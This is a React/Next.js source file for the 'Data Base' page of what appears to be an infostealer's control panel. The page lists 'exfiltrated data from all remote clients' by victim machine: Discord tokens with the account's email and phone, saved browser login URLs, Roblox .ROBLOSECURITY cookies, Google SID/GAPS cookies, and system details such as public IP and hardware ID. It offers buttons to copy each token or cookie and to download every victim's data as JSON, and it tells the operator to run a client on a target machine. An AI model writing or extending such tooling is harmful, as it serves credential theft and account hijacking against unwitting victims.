"use client"

import { useState, useEffect } from "react"
import { motion, AnimatePresence } from "framer-motion"
import { Button, Badge, Spinner } from "@/components/ui"
import Link from "next/link"

interface ClientFolder {
  id: string; clientId: string; hostname: string; sessionName: string
  country: string | null; os: string | null; ipPublic: string | null; lastHeartbeat: string | null
  data: DataItem[]
}

interface DataItem {
  id: string; type: string; source: string | null; data: string; createdAt: string
}

const TYPE_ICONS: Record<string, string> = {
  discord_token: "💬",
  browser_passwords: "🔑",
  system_info: "🖥️",
  roblox_cookies: "🎮",
  google_cookies: "🔴",
  discord_browser_cookies: "💜",
}

const TYPE_LABELS: Record<string, string> = {
  discord_token: "Discord Tokens",
  browser_passwords: "Browser Passwords",
  system_info: "System Info",
  roblox_cookies: "Roblox Cookies",
  google_cookies: "Google Cookies",
  discord_browser_cookies: "Discord Browser",
}

export default function DatabasePage() {
  const [clients, setClients] = useState<ClientFolder[]>([])
  const [stats, setStats] = useState({ totalData: 0, totalClients: 0, discordTokens: 0, browserPasswords: 0, robloxCookies: 0, googleCookies: 0 })
  const [loading, setLoading] = useState(true)
  const [expanded, setExpanded] = useState<string | null>(null)
  const [activeType, setActiveType] = useState<string | null>(null)
  const [search, setSearch] = useState("")

  function fetchData() {
    setLoading(true)
    fetch("/api/remote/database")
      .then(r => r.json())
      .then(d => { setClients(d.clients || []); setStats(d.stats || {}) })
      .finally(() => setLoading(false))
  }

  useEffect(() => { fetchData() }, [])

  function downloadClient(client: ClientFolder) {
    const json = JSON.stringify(client.data, null, 2)
    const blob = new Blob([json], { type: "application/json" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `${client.sessionName}_data_${Date.now()}.json`
    a.click()
    URL.revokeObjectURL(url)
  }

  function toggleExpand(id: string) {
    setExpanded(expanded === id ? null : id)
    setActiveType(null)
  }

  function formatDate(d: string) {
    return new Date(d).toLocaleString("en-US", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" })
  }

  const filtered = clients.filter(c => {
    if (!search) return true
    const q = search.toLowerCase()
    return (
      c.sessionName.toLowerCase().includes(q) ||
      c.hostname.toLowerCase().includes(q) ||
      c.country?.toLowerCase().includes(q) ||
      c.ipPublic?.toLowerCase().includes(q)
    )
  })

  const types = ["discord_token", "browser_passwords", "system_info", "roblox_cookies", "google_cookies", "discord_browser_cookies"]

  return (
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-5 pb-8">
      <div className="flex items-center justify-between flex-wrap gap-3">
        <div>
          <h1 className="text-2xl font-bold text-white">Data Base</h1>
          <p className="text-xs text-zinc-400 mt-1">Exfiltrated data from all remote clients</p>
        </div>
        <Button size="sm" onClick={fetchData} loading={loading}>Refresh</Button>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
        {[
          { v: stats.totalClients, l: "Clients", c: "#8b5cf6" },
          { v: stats.totalData, l: "Records", c: "#22c55e" },
          { v: stats.discordTokens, l: "Discord Tokens", c: "#eab308" },
          { v: stats.browserPasswords, l: "Passwords", c: "#3b82f6" },
          { v: stats.robloxCookies || 0, l: "Roblox", c: "#f97316" },
          { v: stats.googleCookies || 0, l: "Google", c: "#ef4444" },
        ].map(({ v, l, c }) => (
          <div key={l} className="rounded-xl border border-zinc-800 bg-zinc-900/60 p-4">
            <span className="text-2xl font-bold" style={{ color: c }}>{v}</span>
            <p className="text-[10px] text-zinc-500 uppercase mt-1">{l}</p>
          </div>
        ))}
      </div>

      {/* Search */}
      <div className="relative">
        <svg className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
        <input
          placeholder="Search by session name, hostname, country, IP..."
          value={search}
          onChange={e => setSearch(e.target.value)}
          className="w-full pl-10 pr-4 py-3 rounded-xl border border-zinc-800 bg-zinc-900/60 text-sm text-white placeholder-zinc-500 focus:outline-none focus:border-primary/50"
        />
      </div>

      {/* Client Folders */}
      {loading ? (
        <div className="flex justify-center py-12"><Spinner /></div>
      ) : filtered.length === 0 ? (
        <div className="text-center py-16 rounded-2xl border border-zinc-800 bg-zinc-900/60">
          <span className="text-5xl block mb-4">📂</span>
          <p className="text-zinc-400 text-lg font-medium">No data collected yet</p>
          <p className="text-sm text-zinc-500 mt-1">Run a client on a target machine to start collecting data</p>
        </div>
      ) : (
        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
          {filtered.map(client => {
            const isExpanded = expanded === client.id
            // Count by type
            const typeCounts: Record<string, number> = {}
            client.data.forEach(d => { typeCounts[d.type] = (typeCounts[d.type] || 0) + 1 })

            return (
              <motion.div
                key={client.id}
                layout
                className={`rounded-2xl border transition-all duration-200 ${
                  isExpanded ? "border-primary/50 bg-zinc-900/80 ring-1 ring-primary/20" : "border-zinc-800 bg-zinc-900/60 hover:border-zinc-700"
                }`}
              >
                {/* Folder Header */}
                <button
                  onClick={() => toggleExpand(client.id)}
                  className="w-full p-5 text-left"
                >
                  <div className="flex items-start justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-purple-600 to-blue-600 flex items-center justify-center text-2xl">
                        📁
                      </div>
                      <div>
                        <p className="text-sm font-bold text-white">{client.sessionName}</p>
                        <p className="text-[11px] text-zinc-400">{client.hostname || client.clientId?.substring(0, 8)}</p>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="text-[10px] text-zinc-500">{client.data.length} items</span>
                      <svg className={`w-4 h-4 text-zinc-400 transition-transform ${isExpanded ? "rotate-180" : ""}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="6 9 12 15 18 9"/></svg>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 mt-3 text-[10px] text-zinc-500">
                    {client.country && <span>{client.country}</span>}
                    {client.os && <span>· {client.os}</span>}
                    {client.ipPublic && <span>· {client.ipPublic}</span>}
                  </div>
                  {/* Type chips */}
                  <div className="flex items-center gap-1.5 mt-2">
                    {Object.entries(typeCounts).map(([type, count]) => (
                      <span key={type} className="px-2 py-0.5 rounded-md text-[10px] font-medium bg-zinc-800 text-zinc-300">
                        {TYPE_ICONS[type] || "📄"} {count}
                      </span>
                    ))}
                  </div>
                </button>

                {/* Expanded Content */}
                <AnimatePresence>
                  {isExpanded && (
                    <motion.div
                      initial={{ height: 0, opacity: 0 }}
                      animate={{ height: "auto", opacity: 1 }}
                      exit={{ height: 0, opacity: 0 }}
                      className="overflow-hidden"
                    >
                      <div className="px-5 pb-5 space-y-4">
                        {/* Action Buttons */}
                        <div className="flex items-center gap-2">
                          <Button size="sm" onClick={() => downloadClient(client)}>
                            <svg className="w-3.5 h-3.5 mr-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                            Download JSON
                          </Button>
                          <Link href={`/dashboard/remote/clients/${client.id}`} className="px-3 py-1.5 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-xs text-zinc-300 transition-colors">
                            Open Client →
                          </Link>
                        </div>

                        {/* Type filter chips */}
                        <div className="flex items-center gap-1.5">
                          <button
                            onClick={() => setActiveType(activeType === null ? null : null)}
                            className={`px-2 py-1 rounded-md text-[10px] font-medium transition-colors ${!activeType ? "bg-primary/20 text-primary" : "text-zinc-400 hover:text-white"}`}
                          >All ({client.data.length})</button>
                          {types.filter(t => typeCounts[t]).map(t => (
                            <button
                              key={t}
                              onClick={() => setActiveType(activeType === t ? null : t)}
                              className={`px-2 py-1 rounded-md text-[10px] font-medium transition-colors ${activeType === t ? "bg-primary/20 text-primary" : "text-zinc-400 hover:text-white"}`}
                            >{TYPE_ICONS[t]} {typeCounts[t]}</button>
                          ))}
                        </div>

                        {/* Data Items */}
                        <div className="space-y-2 max-h-[400px] overflow-y-auto">
                          {client.data
                            .filter(d => !activeType || d.type === activeType)
                            .map((item, idx) => {
                              let parsed: any = {}
                              try { parsed = JSON.parse(item.data) } catch { parsed = { raw: item.data } }

                              if (item.type === "discord_token") {
                                return (
                                  <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
                                    <div className="flex items-center justify-between mb-2">
                                      <Badge variant="warning" className="text-[9px]">💬 Discord Token</Badge>
                                      <span className="text-[9px] text-zinc-500">{formatDate(item.createdAt)}</span>
                                    </div>
                                    <div className="grid grid-cols-2 gap-2 text-[10px]">
                                      <div><span className="text-zinc-500">User:</span> <span className="text-white font-medium">{parsed.username || "?"}</span></div>
                                      <div><span className="text-zinc-500">Email:</span> <span className="text-zinc-300">{parsed.email || "N/A"}</span></div>
                                      <div><span className="text-zinc-500">Phone:</span> <span className="text-zinc-300">{parsed.phone || "N/A"}</span></div>
                                      <div><span className="text-zinc-500">Nitro:</span> <span className="text-yellow-400">{parsed.nitro || "None"}</span></div>
                                    </div>
                                    {parsed.token && (
                                      <div className="mt-2 flex items-center gap-2">
                                        <code className="text-[10px] text-zinc-400 bg-black/40 px-2 py-1 rounded flex-1 break-all font-mono">{parsed.token.substring(0, 40)}...</code>
                                        <button onClick={() => navigator.clipboard.writeText(parsed.token)} className="text-[9px] px-2 py-1 rounded bg-zinc-700 hover:bg-zinc-600 text-zinc-300">Copy</button>
                                      </div>
                                    )}
                                  </div>
                                )
                              }

                              if (item.type === "browser_passwords") {
                                return (
                                  <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
                                    <div className="flex items-center justify-between mb-2">
                                      <Badge variant="primary" className="text-[9px]">🔑 {item.source || "Browser Passwords"}</Badge>
                                      <span className="text-[9px] text-zinc-500">{formatDate(item.createdAt)}</span>
                                    </div>
                                    <p className="text-[10px] text-zinc-400">{parsed.urls_found} saved login URLs found</p>
                                    {parsed.urls && (
                                      <div className="mt-2 max-h-20 overflow-y-auto bg-black/40 rounded p-2">
                                        {parsed.urls.slice(0, 10).map((url: string, i: number) => (
                                          <p key={i} className="text-[9px] text-zinc-500 font-mono truncate">{url}</p>
                                        ))}
                                      </div>
                                    )}
                                    {parsed.note && <p className="text-[9px] text-zinc-600 mt-2">{parsed.note}</p>}
                                  </div>
                                )
                              }

                              if (item.type === "roblox_cookies") {
                                return (
                                  <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
                                    <div className="flex items-center justify-between mb-2">
                                      <Badge variant="danger" className="text-[9px]">🎮 Roblox Cookie</Badge>
                                      <span className="text-[9px] text-zinc-500">{formatDate(item.createdAt)}</span>
                                    </div>
                                    <p className="text-[10px] text-zinc-400 mb-2">{parsed.note || ".ROBLOSECURITY cookie found"}</p>
                                    <div className="flex items-center gap-2 bg-black/40 rounded-lg p-2">
                                      <code className="text-[10px] text-orange-400 font-mono flex-1 break-all">{parsed.cookie?.substring(0, 60) || "..."}</code>
                                      {parsed.cookie && (
                                        <button onClick={() => navigator.clipboard.writeText(parsed.cookie)} className="text-[9px] px-2 py-1 rounded bg-zinc-700 hover:bg-zinc-600 text-zinc-300 shrink-0">Copy</button>
                                      )}
                                    </div>
                                  </div>
                                )
                              }

                              if (item.type === "google_cookies") {
                                return (
                                  <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
                                    <div className="flex items-center justify-between mb-2">
                                      <Badge variant="success" className="text-[9px]">🔴 Google Cookies</Badge>
                                      <span className="text-[9px] text-zinc-500">{formatDate(item.createdAt)}</span>
                                    </div>
                                    <p className="text-[10px] text-zinc-400 mb-2">{parsed.accounts_found} account(s) found</p>
                                    {parsed.cookies && Array.isArray(parsed.cookies) && parsed.cookies.map((acc: any, i: number) => (
                                      <div key={i} className="bg-black/40 rounded-lg p-2 mb-2">
                                        <div className="flex items-center gap-2 text-[10px]">
                                          <span className="text-zinc-500">Source:</span>
                                          <span className="text-zinc-300">{acc.source || "Browser"}</span>
                                        </div>
                                        {acc.email && (
                                          <div className="flex items-center gap-2 text-[10px] mt-1">
                                            <span className="text-zinc-500">Email:</span>
                                            <span className="text-cyan-400 font-mono">{acc.email}</span>
                                          </div>
                                        )}
                                        <div className="flex items-center gap-1 mt-1">
                                          {acc.SID_found && <span className="px-1.5 py-0.5 rounded bg-green-500/20 text-green-400 text-[9px]">SID</span>}
                                          {acc.GAPS_found && <span className="px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 text-[9px]">GAPS</span>}
                                        </div>
                                      </div>
                                    ))}
                                    <p className="text-[9px] text-zinc-500 mt-1">{parsed.note}</p>
                                  </div>
                                )
                              }

                              if (item.type === "discord_browser_cookies") {
                                return (
                                  <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
                                    <div className="flex items-center justify-between mb-2">
                                      <Badge variant="warning" className="text-[9px]">💜 Discord Browser Cookie</Badge>
                                      <span className="text-[9px] text-zinc-500">{formatDate(item.createdAt)}</span>
                                    </div>
                                    <div className="flex items-center gap-2 bg-black/40 rounded-lg p-2">
                                      <code className="text-[10px] text-purple-400 font-mono flex-1 break-all">{parsed.cookie?.substring(0, 60) || "..."}</code>
                                      {parsed.cookie && (
                                        <button onClick={() => navigator.clipboard.writeText(parsed.cookie)} className="text-[9px] px-2 py-1 rounded bg-zinc-700 hover:bg-zinc-600 text-zinc-300 shrink-0">Copy</button>
                                      )}
                                    </div>
                                    <p className="text-[9px] text-zinc-500 mt-1">{parsed.note}</p>
                                  </div>
                                )
                              }
                                return (
                                  <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
                                    <div className="flex items-center justify-between mb-2">
                                      <Badge variant="success" className="text-[9px]">🖥️ System Info</Badge>
                                      <span className="text-[9px] text-zinc-500">{formatDate(item.createdAt)}</span>
                                    </div>
                                    <div className="grid grid-cols-3 gap-1.5 text-[10px]">
                                      {[
                                        { l: "Hostname", v: parsed.hostname },
                                        { l: "Username", v: parsed.username },
                                        { l: "OS", v: parsed.os },
                                        { l: "Public IP", v: parsed.public_ip },
                                        { l: "Local IP", v: parsed.local_ip },
                                        { l: "HWID", v: parsed.hardware_id?.substring(0, 12) },
                                        { l: "CPU", v: parsed.cpu ? `${parsed.cpu}%` : "-" },
                                        { l: "RAM", v: parsed.ram_total_gb ? `${parsed.ram_used_gb?.toFixed(1)}/${parsed.ram_total_gb?.toFixed(1)}GB` : "-" },
                                      ].map(({ l, v }) => (
                                        <div key={l} className="flex flex-col"><span className="text-zinc-500">{l}</span><span className="text-zinc-300 font-mono">{v || "-"}</span></div>
                                      ))}
                                    </div>
                                  </div>
                                )
                              }

                              return (
                                <div key={item.id} className="p-3 rounded-lg bg-zinc-800/50 border border-zinc-700/50">
                                  <div className="flex items-center justify-between mb-1">
                                    <Badge variant="secondary" className="text-[9px]">{item.type.replace(/_/g, " ")}</Badge>
                                    <span className="text-[9px] text-zinc-500">{formatDate(item.createdAt)}</span>
                                  </div>
                                  <pre className="text-[10px] text-zinc-400 whitespace-pre-wrap break-all max-h-20 overflow-y-auto">{item.data}</pre>
                                </div>
                              )
                            })}
                        </div>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </motion.div>
            )
          })}
        </div>
      )}
    </motion.div>
  )
}
